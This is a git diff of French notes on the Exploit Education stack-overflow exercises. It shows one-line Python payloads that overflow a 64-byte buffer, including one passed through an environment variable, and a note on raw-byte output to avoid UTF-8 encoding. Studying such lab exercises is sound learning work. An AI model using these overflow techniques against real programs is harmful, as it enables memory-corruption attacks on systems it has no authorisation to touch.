@@ -104,7 +104,14 @@ fix: if(sizeof(buffer)>64)local.changeme=0;
 print("A"*64 + 'IlYb')
 
 **stack-two**
+
 Cette fois on overflow dans la stack avec strcpy et une variable d'environnement :
 export ExploitEducation=$(python3 -c 'print("A"*64+"\x0a\x09\x0a\x0d")')
+
+**stack-tree**
+expliquer histoire du c2 qui se rajoute à cause du problème d'utf-8 car traduction d'un nombre qui n'existe pas dans la table ascii. 9d>7f
+
+il faut désactiver l'encodage utf8 en octet pur donc plus de printf mais stdout
+
 
 
